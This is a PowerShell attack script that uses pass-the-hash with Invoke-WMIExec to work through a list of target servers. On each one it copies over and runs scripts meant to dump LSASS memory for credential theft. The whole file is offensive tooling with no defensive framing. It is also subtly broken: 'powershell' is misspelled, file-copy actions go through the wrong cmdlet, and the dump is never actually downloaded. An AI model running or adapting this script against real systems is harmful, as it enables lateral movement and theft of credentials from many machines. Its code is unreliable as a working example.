import-module .\Invoke-WMIExec.ps1
import-module .\Invoke-SMBClient.ps1

Start-Transcript

# Change these variables
$servers = gc c:\temp\TargetServerList.txt
$user = "username"
$hash = "NTLM Hash"
$domain = "domain"

foreach ($server in $servers){

  get-date
  echo "Starting work on: " $server
  echo "Deleting any previous lsass dumps"
  Invoke-Wmiexec -Domain $domain -Username $user -Hash $hash -Command "del c:\temp\lsass*" -Target $server -Verbose
  
  echo "Deleting old scripts"
  Invoke-Wmiexec -Domain $domain -Username $user -Hash $hash -Action Delete -Source \\$server\c$\Temp\Minidump.ps1 -verbose
  Invoke-Wmiexec -Domain $domain -Username $user -Hash $hash -Action Delete -Source \\$server\c$\Temp\Minirun.ps1 -verbose
  
  echo "Copying new scripts"
  Invoke-Wmiexec -Domain $domain -Username $user -Hash $hash -Action Put -Source c:\Temp\Minidump.ps1 -Destination \\$server\c$\Temp\Minidump.ps1
  Invoke-Wmiexec -Domain $domain -Username $user -Hash $hash -Action Put -Source c:\Temp\Minirun.ps1 -Destination \\$server\c$\Temp\Minirun.ps1

  echo "Executing Minirun and downloading dump file"
  Invoke-Wmiexec -Domain $domain -Username $user -Hash $hash -Command "powersehll.exe -file c:\temp\Minirun.ps1" -Target $server -Verbose
}

Stop-Transcript
